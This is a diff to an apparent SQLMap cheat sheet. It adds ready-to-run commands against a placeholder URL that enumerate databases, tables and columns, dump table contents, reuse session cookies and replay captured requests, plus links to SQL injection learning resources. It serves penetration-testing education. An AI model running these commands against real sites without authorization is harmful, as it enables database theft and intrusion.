@@ -30,6 +30,32 @@ SQLMap is an open-source penetration testing tool that automates the process of 
 - `--columns` : **List column names** of a table. Useful to understand the structure of a table.
 - `--count` : **Count the total number of records** in a table. Helps gauge the amount of data.
 
+## Commonly Used SQLMap Commands
+
+1. `sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs`  
+   **List all databases** available on the target.
+
+2. `sqlmap -u "http://example.com/vulnerable.php?id=1" -D <database_name> --tables`  
+   **Retrieve table names** from the specified database.
+
+3. `sqlmap -u "http://example.com/vulnerable.php?id=1" -D <database_name> -T <table_name> --columns`  
+   **List columns** from the specified table.
+
+4. `sqlmap -u "http://example.com/vulnerable.php?id=1" -D <database_name> -T <table_name> --dump`  
+   **Dump all data** from the specified table.
+
+5. `sqlmap -u "http://example.com/vulnerable.php?id=1" --cookie="SESSIONID=abcdef" --dbs`  
+   **Include a cookie** to access authenticated pages.
+
+6. `sqlmap -u "http://example.com/vulnerable.php?id=1" --wizard`  
+   **Use wizard mode** for guided execution.
+
+7. `sqlmap -u "http://example.com/vulnerable.php?id=1" --mobile`  
+   **Simulate requests from a mobile device.**
+
+8. `sqlmap -r req.txt --dbs --random-agent`  
+   **Use an HTTP request file** (e.g., captured by tools like Burp Suite) to target specific requests with a random user agent.
+
 ## SQL Shell Options
 
 - `--sql-shell` : **Open an interactive SQL shell**. Allows running SQL queries directly on the database.
@@ -54,3 +80,14 @@ SQLMap is an open-source penetration testing tool that automates the process of 
 - Always check for authorization before testing a website to ensure ethical use.
 - Combine multiple options (e.g., `-D`, `--tables`, `--columns`) for targeted attacks to minimize noise.
 - Use tamper scripts wisely to bypass advanced protections or obfuscate queries.
+
+## More Learning
+
+For further learning about SQLMap and SQL injection, check out the following resources:
+
+- [SQLMap Official Documentation](https://sqlmap.org/documentation/)
+- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
+- [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap)
+- [TryHackMe SQLMap Room](https://tryhackme.com/room/sqlmap)
+- [PentesterLab SQL Injection Exercises](https://pentesterlab.com/exercises/from_sqli_to_shell/course)
+- [HackTricks SQL Injection Wiki](https://book.hacktricks.xyz/pentesting-web/sql-injection)
